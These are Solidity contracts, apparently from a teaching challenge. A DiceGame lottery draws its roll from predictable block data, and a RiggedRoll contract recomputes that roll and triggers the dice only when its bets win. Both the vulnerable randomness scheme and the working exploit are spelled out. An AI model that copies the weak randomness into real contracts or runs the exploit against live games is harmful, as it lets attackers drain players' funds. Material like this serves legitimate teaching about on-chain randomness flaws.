// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

// import "hardhat/console.sol";

contract DiceGame {

    uint256 public prize = 0;
    // block number / 10 -> number -> addresses
    mapping(uint256 => mapping(uint8 => address[])) public bets;
    // block number / 10 -> rolled?
    mapping(uint256 => bool) public rolled;

    event Difficulty(address indexed player, uint256 indexed blockNumber, uint256 difficulty);
    event Bet(uint256 indexed blockNumber, address indexed player, uint8 indexed number);
    event Roll(address indexed player, uint256 indexed blockNumber, uint8 indexed roll);
    event Winner(address indexed winner, uint256 indexed blockNumber, uint256 amount);
    event Tip(address indexed winner, uint256 indexed blockNumber, uint256 amount);

    constructor() payable {
    }

    function betsOnNumber(uint256 blockNumber, uint8 number) public view returns (address[] memory) {
        return bets[blockNumber][number];
    }

    // you can bet on even block number tens (like 1000, 1020, 1040, ...)
    function bet(uint8 number) public payable {
        require(msg.value >= 0.002 ether, "Failed to send enough value");
        require(number < 16, "Only numbers between 0 and 15");
        require((block.number / 10) % 2 == 0, "you can bet only on even block number tens (like 1000, 1020, 1040, ...)");

        bets[block.number / 10 * 10][number].push(msg.sender);

        prize += 0.0018 ether;

        emit Bet(block.number / 10 * 10, msg.sender, number);
    }

    function canBet() public view returns (bool) {
        return (block.number / 10) % 2 == 0;
    }

    function canRoll() public view returns (bool) {
        uint256 blockNumber = block.number / 10 * 10 - 10;

        return ((block.number / 10) % 2 == 1) && (block.number % 10 >= 5) && !rolled[blockNumber];
    }

    // the dice can be rolled on odd block number tens after 5 (like 1015 to 1019, 1035 to 1039, 1055 to 1059, ...)
    function rollTheDice() public {
        require((block.number / 10) % 2 == 1, "the dice can be rolled only on odd block number tens after 5 (like 1015 to 1019, 1035 to 1039, 1055 to 1059, ...)");
        require(block.number % 10 >= 5, "the dice can be rolled only on odd block number tens after 5 (like 1015 to 1019, 1035 to 1039, 1055 to 1059, ...)");

        uint256 blockNumber = block.number / 10 * 10 - 10;

        require(!rolled[blockNumber], "dice already rolled!");

        rolled[blockNumber] = true;

        emit Difficulty(msg.sender, blockNumber, block.difficulty);

        // console.log("difficulty: ", block.difficulty);
        bytes32 hash = keccak256(abi.encodePacked(block.difficulty, address(this), blockNumber));
        uint8 roll = uint8(uint256(hash) % 16);

        // console.log("THE ROLL IS ", roll);

        emit Roll(msg.sender, blockNumber, roll);

        uint256 winnersCount = bets[blockNumber][roll].length;

        uint256 tipAmount = prize / 10;
        (bool sentTip, ) = msg.sender.call{value: tipAmount}("");
        require(sentTip, "Failed to send Ether");

        emit Tip(msg.sender, blockNumber, tipAmount);

        prize = prize - tipAmount;

        if (winnersCount > 0) {
            uint256 amount = prize / winnersCount;

            for (uint i = 0; i < winnersCount; i++) {

                (bool sent, ) = bets[blockNumber][roll][i].call{value: amount}("");
                require(sent, "Failed to send Ether");

                emit Winner(bets[blockNumber][roll][i], blockNumber, amount);
            }

            prize = 0;
        }
    }

    receive() external payable {  }
}

pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

// import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event Difficulty(address indexed player, uint256 indexed blockNumber, uint256 difficulty);
    event Roll(address indexed player, uint256 indexed blockNumber, uint8 indexed roll);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner (we bet for 0, 1 and 2)
    function riggedRoll() public {
        //bytes32 prevHash = blockhash(block.number - 1);
        // console.log("difficulty: ", block.difficulty);

        uint256 blockNumber = block.number / 10 * 10 - 10;

        emit Difficulty(msg.sender, blockNumber, block.difficulty);

        bytes32 hash = keccak256(abi.encodePacked(block.difficulty, address(diceGame), blockNumber));
        uint8 roll = uint8(uint256(hash) % 16);

        emit Roll(msg.sender, blockNumber, roll);

        // console.log("THE ROLL IS ",roll);

        require(roll <= 2, "no win");

        diceGame.rollTheDice();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {  }
}